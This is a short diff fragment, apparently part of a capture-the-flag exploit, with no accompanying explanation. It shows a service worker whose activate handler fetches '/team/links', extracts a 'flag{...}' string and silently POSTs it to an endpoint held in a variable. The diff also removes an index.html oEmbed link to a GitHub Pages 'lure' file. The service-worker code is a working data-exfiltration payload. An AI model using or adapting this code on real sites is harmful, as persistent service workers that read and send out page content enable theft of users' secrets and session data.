@@ -7,6 +7,3 @@ self.addEventListener("activate", (e) => e.waitUntil((async () => {
   const m = (await (await fetch("/team/links")).text()).match(/flag\{[^}]+\}/);
   if (m) await fetch(C, { method: "POST", mode: "no-cors", body: m[0] });
 })()));
-index.html head
-<link rel="alternate" type="application/json+oembed"
-      href="https://psseudo.github.io/lure/oembed.json">
